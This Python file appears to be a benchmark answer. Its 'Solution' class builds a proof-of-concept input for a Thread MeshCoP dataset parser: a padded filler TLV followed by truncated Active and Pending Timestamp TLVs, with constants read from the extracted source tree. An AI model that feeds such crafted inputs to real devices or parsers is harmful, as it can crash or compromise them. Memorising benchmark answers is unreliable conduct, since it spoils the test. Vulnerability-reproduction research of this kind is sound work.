import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple


class Solution:
    def _maybe_extract(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path
        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            return tmpdir
        # If tarball contains a single top-level directory, use it.
        try:
            entries = [e for e in os.listdir(tmpdir) if e not in (".", "..")]
            if len(entries) == 1:
                p = os.path.join(tmpdir, entries[0])
                if os.path.isdir(p):
                    return p
        except Exception:
            pass
        return tmpdir

    def _find_fuzzer_files(self, root: str, limit: int = 20) -> list:
        out = []
        for dirpath, dirnames, filenames in os.walk(root):
            # prune common large dirs
            dn = os.path.basename(dirpath)
            if dn in ("build", "out", ".git", ".hg", ".svn", "third_party", "extern", "external"):
                dirnames[:] = []
                continue
            for fn in filenames:
                if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                    continue
                if "fuzz" not in fn.lower() and "fuzzer" not in fn.lower():
                    continue
                p = os.path.join(dirpath, fn)
                out.append(p)
                if len(out) >= limit:
                    return out
        return out

    def _detect_prefix_len(self, root: str) -> int:
        # Heuristic: if the fuzz target offsets the input pointer by 1, add a leading byte.
        candidates = self._find_fuzzer_files(root, limit=50)
        for p in candidates:
            try:
                st = os.stat(p)
                if st.st_size > 2_000_000:
                    continue
                with open(p, "r", encoding="utf-8", errors="ignore") as f:
                    s = f.read()
            except Exception:
                continue
            if "LLVMFuzzerTestOneInput" not in s:
                continue
            if re.search(r"\b(aData|data)\s*\+\s*1\b", s) and re.search(r"\b(aSize|size)\s*-\s*1\b", s):
                if re.search(r"\bDataset\b", s, re.IGNORECASE) or re.search(r"\boperational\s*dataset\b", s, re.IGNORECASE):
                    return 1
        return 0

    def _find_const(self, root: str, name: str) -> Optional[int]:
        # Search common TLV header files first; fallback to broad scan.
        preferred = []
        for dirpath, dirnames, filenames in os.walk(root):
            dn = os.path.basename(dirpath).lower()
            if dn in ("build", "out", ".git", ".hg", ".svn"):
                dirnames[:] = []
                continue
            for fn in filenames:
                lfn = fn.lower()
                if not fn.endswith((".h", ".hpp", ".c", ".cc", ".cpp", ".cxx")):
                    continue
                if "tlv" in lfn or "dataset" in lfn or "meshcop" in lfn:
                    preferred.append(os.path.join(dirpath, fn))

        pattern = re.compile(rf"(?:\b{name}\b)\s*=\s*(0x[0-9a-fA-F]+|\d+)\b")
        for p in preferred:
            try:
                st = os.stat(p)
                if st.st_size > 2_000_000:
                    continue
                with open(p, "r", encoding="utf-8", errors="ignore") as f:
                    s = f.read()
            except Exception:
                continue
            m = pattern.search(s)
            if m:
                v = m.group(1)
                try:
                    return int(v, 0)
                except Exception:
                    pass
        return None

    def solve(self, src_path: str) -> bytes:
        root = self._maybe_extract(src_path)
        prefix_len = self._detect_prefix_len(root)

        # Try to detect TLV type values from source; fall back to Thread MeshCoP defaults.
        active_type = self._find_const(root, "kActiveTimestamp")
        pending_type = self._find_const(root, "kPendingTimestamp")
        if active_type is None:
            active_type = 0x0E
        if pending_type is None:
            pending_type = 0x0F

        total_len = 262
        tlvs_len = total_len
        if prefix_len == 1:
            total_len = 263
            tlvs_len = 262

        # Compose TLVs of exact length tlvs_len. Use a large "unknown" TLV as filler, then two truncated timestamps.
        # TLV format: [type:1][len:1][value:len]
        tail = bytes([active_type & 0xFF, 0x01, 0x00, pending_type & 0xFF, 0x01, 0x00])
        filler_type = 0x80
        filler_value_len = tlvs_len - len(tail) - 2
        if filler_value_len < 0:
            filler_value_len = 0
        if filler_value_len > 255:
            filler_value_len = 255
        filler = bytes([filler_type, filler_value_len]) + (b"A" * filler_value_len)

        tlvs = filler + tail
        if len(tlvs) < tlvs_len:
            tlvs += b"B" * (tlvs_len - len(tlvs))
        elif len(tlvs) > tlvs_len:
            tlvs = tlvs[:tlvs_len]

        if prefix_len == 1:
            return b"\x00" + tlvs
        return tlvs